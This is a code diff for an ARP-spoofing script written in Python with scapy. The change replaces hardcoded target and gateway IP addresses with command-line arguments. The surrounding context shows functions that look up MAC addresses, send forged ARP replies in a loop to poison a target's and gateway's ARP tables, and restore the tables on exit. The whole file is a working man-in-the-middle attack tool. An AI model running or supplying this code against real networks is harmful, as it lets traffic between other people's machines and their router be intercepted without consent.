@@ -4,10 +4,16 @@
 
 import scapy.all as scapy, time, argparse
 
-target_ip = "192.168.10.198"
-gateway_ip = "192.168.10.1"
-
-
+def get_arguments():
+    parser = argparse.ArgumentParser() # creating an ArgumentParser object
+    parser.add_argument("-t", "--target", dest = "target", help = "Give the IP address of the target machine") # adding an argument to the parser
+    parser.add_argument("-g", "--getway", dest = "gateway", help = "Give the IP address of the gateway machine") # adding an argument to the parser
+    options = parser.parse_args() # parsing the arguments
+    if not options.target: # if the user doesn't specify the target
+        parser.error("[-] Please specify the IP address of the target machine, use --help for more info.") # printing an error message
+    elif not options.gateway: # if the user doesn't specify the gateway
+        parser.error("[-] Please specify the IP address of the gateway machine, use --help for more info.")
+    return options # returning the parsed arguments
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip) # creating an ARP request object
@@ -15,7 +21,6 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request # combining the two objects
     answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # sending the request and storing the answered and unanswered requests
     return answered_list[0][1].hwsrc # returning the MAC address of the target
-
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip) # getting the MAC address of the target
@@ -28,6 +33,11 @@ def restore(destination_ip, source_ip):
     source_mac = get_mac(source_ip) # getting the MAC address of the source
     packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst  =  destination_mac, psrc = source_ip, hwsrc = source_mac) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
     scapy.send(packet, verbose = False) # sending the packet
+
+
+options = get_arguments() # getting the arguments
+target_ip = options.target # storing the target IP
+gateway_ip = options.gateway # storing the gateway IP
 
 try:
     sent_packets_count = 0
@@ -44,4 +54,4 @@ except KeyboardInterrupt:
     restore(gateway_ip, target_ip) # restoring the ARP tables
 
 finally:
-    print(" [+] Resetting ARP tables ==> Please wait.")
+    print(" [+] Resetting ARP tables ==> Please wait.") # printing the message
